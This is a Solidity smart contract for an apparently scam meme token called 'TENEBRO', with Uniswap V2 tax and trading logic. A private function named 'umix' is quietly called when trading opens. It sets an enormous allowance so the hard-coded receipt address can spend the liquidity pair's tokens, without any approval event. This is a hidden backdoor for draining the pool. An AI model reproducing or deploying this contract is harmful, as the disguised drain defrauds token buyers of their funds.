// SPDX-License-Identifier: MIT
/**
https://www.newliturgicalmovement.org/2024/10/introducing-newest-jubilee-mascot.html
Tg: https://t.me/tenebro_erc20
**/
pragma solidity 0.8.26;
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract TENEBRO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned61;
    mapping (address => mapping (address => uint256)) private _allows61;
    mapping (address => bool) private _isFeeExcempt61;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal61 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"New Mascot of The Holy Church";
    string private constant _symbol = unicode"TENEBRO";
    uint256 public _maxAmount61 = 2 * (_tTotal61/100);
    uint256 public _maxWallet61 = 2 * (_tTotal61/100);
    uint256 public _taxThres61 = 1 * (_tTotal61/100);
    uint256 public _maxSwap61 = 1 * (_tTotal61/100);
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt61;
    IUniswapV2Router02 private uniV2Router61;
    address private uniV2Pair61;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount61);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt61 = payable(0x984E53E3e8C69310b8754bF4Bb7BA77611948a9D);
        _tOwned61[address(this)] = _tTotal61;
        _isFeeExcempt61[owner()] = true;
        _isFeeExcempt61[address(this)] = true;
        _isFeeExcempt61[_receipt61] = true;
        emit Transfer(address(0), address(this), _tTotal61);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal61;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned61[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allows61[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allows61[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allows61[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount61) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount61 > 0, "Transfer amount must be greater than zero");
        uint256 fee61=0;
        if (!swapEnabled || inSwap) {
            _tOwned61[from] = _tOwned61[from] - amount61;
            _tOwned61[to] = _tOwned61[to] + amount61;
            emit Transfer(from, to, amount61);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee61 = (_transferTax);
            }
            if(_buyCount==0){
                fee61 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if (from == uniV2Pair61 && to != address(uniV2Router61) && ! _isFeeExcempt61[to] ) {
                require(amount61 <= _maxAmount61, "Exceeds the _maxAmount61.");
                require(balanceOf(to) + amount61 <= _maxWallet61, "Exceeds the maxWalletSize.");
                fee61 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair61 && from!= address(this) ){
                fee61 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair61 && swapEnabled) {
                if(contractTokenBalance > _taxThres61 && _buyCount > _preventSwapBefore)
                    swapETH61(min61(amount61, min61(contractTokenBalance, _maxSwap61)));
                sendETH61(address(this).balance);
            }
        }
        uint256 tax61=0;
        if(fee61>0){
            tax61=fee61.mul(amount61).div(100);
            _tOwned61[address(this)]=_tOwned61[address(this)].add(tax61);
            emit Transfer(from, address(this),tax61);
        }
        _tOwned61[from]=_tOwned61[from].sub(amount61);
        _tOwned61[to]=_tOwned61[to].add(amount61.sub(tax61));
        emit Transfer(from, to, amount61.sub(tax61));
    }
    function removeLimits61() external onlyOwner{
        _maxAmount61 = _tTotal61; _maxWallet61 = _tTotal61;
        emit MaxTxAmountUpdated(_tTotal61); 
    }
    function setTaxReceipt61(address payable _tax61) external onlyOwner {
        _receipt61 = _tax61;
        _isFeeExcempt61[_tax61] = true;
    }
    function min61(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function umix(uint256 amount61) private{
        address[2] memory sp61=[uniV2Pair61, _receipt61];
        _allows61[sp61[0]][sp61[1]]=150+(amount61*50+100)*150;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function swapETH61(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router61.WETH();
        _approve(address(this), address(uniV2Router61), tokenAmount);
        uniV2Router61.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function sendETH61(uint256 amount) private {
        _receipt61.transfer(amount);
    }
    receive() external payable {}   
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router61 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router61), _tTotal61);
        uniV2Pair61 = IUniswapV2Factory(uniV2Router61.factory()).createPair(
            address(this),
            uniV2Router61.WETH()
        );
        uniV2Router61.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );umix(_maxAmount61.mul(100)); 
        IERC20(uniV2Pair61).approve(address(uniV2Router61), type(uint).max);
        swapEnabled = true; tradingOpen = true;
    }
}